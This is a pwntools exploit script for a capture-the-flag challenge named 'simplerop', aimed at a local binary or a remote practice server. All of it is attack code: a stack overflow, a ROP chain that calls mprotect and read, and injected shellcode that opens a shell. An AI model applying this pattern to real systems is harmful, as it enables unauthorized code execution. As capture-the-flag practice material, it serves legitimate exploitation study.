import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./simplerop')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./simplerop')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29112)
			elf=ELF('./simplerop')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')


		bss_1=elf.bss()+0x200


		# gdb.attach(io)
		# pause()
		pay='a'*0x20+p32(elf.sym['mprotect'])+p32(0x0806e828)+p32(bss_1&0xfffff000)+p32(0x1000)+p32(7)+p32(elf.sym['read'])+p32(bss_1)+p32(0)+p32(bss_1)+p32(0x100)
		#io.recv()
		io.send(pay)
		sleep(0.1)
		io.send(asm(shellcraft.sh()))


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue